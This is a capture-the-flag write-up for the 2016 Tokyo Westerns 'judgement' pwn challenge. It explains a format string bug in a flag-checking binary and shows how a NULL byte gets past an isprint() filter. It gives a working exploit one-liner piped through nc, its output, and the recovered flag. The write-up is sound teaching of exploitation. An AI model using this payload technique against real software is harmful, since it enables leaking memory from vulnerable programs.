## Tokey Westerns/MMA CTF 2nd 2016 - judgement (Pwn 50pt)
##### 03/09 - 05/09/2016 (48hr)
___

### Description: 
	Host : pwn1.chal.ctf.westerns.tokyo

	Port : 31729

	judgement
___
### Solution

This challenge was a trivial format string attack. Flag was already loaded in memory at:
```assembly
	.bss:0804A0A0 ; char flag[64]
	.bss:0804A0A0 flag   
```

The format string vulnerability was at:
```assembly
	.text:0804879F                 mov     [esp], eax      ; format
	.text:080487A2                 call    _printf
```


The only tricky part is this:
```assembly
.text:08048787                 jnz     short loc_804879C
.text:08048789                 mov     dword ptr [esp], offset s ; "Unprintable character"
.text:08048790                 call    _puts
.text:08048795                 mov     eax, 0FFFFFFFFh
.text:0804879A                 jmp     short loc_80487D8
```

As you can see only printable characters are allowed. However, function isprint():
```assembly
.text:080488D4                 call    _isprint
```

stops on NULL byte. Thus, all we have to do is to add a NULL byte to bypass this check,
and then we can write non-printable characters.


```
ispo@nogirl:~/ctf$ python -c 'print "%47$x-%47$s-\x00PAD\xa0\xa0\x04\x08"' | nc pwn1.chal.ctf.westerns.tokyo 31729
Flag judgment system
Input flag >> 804a0a0-TWCTF{R3:l1f3_1n_4_pwn_w0rld_fr0m_z3r0}-
Wrong flag...
```

```
ispo@nogirl:~/ctf$ nc pwn1.chal.ctf.westerns.tokyo 31729
Flag judgment system
Input flag >> TWCTF{R3:l1f3_1n_4_pwn_w0rld_fr0m_z3r0}
TWCTF{R3:l1f3_1n_4_pwn_w0rld_fr0m_z3r0}
Correct flag!!
ispo@nogirl:~/ctf$ 
```
___
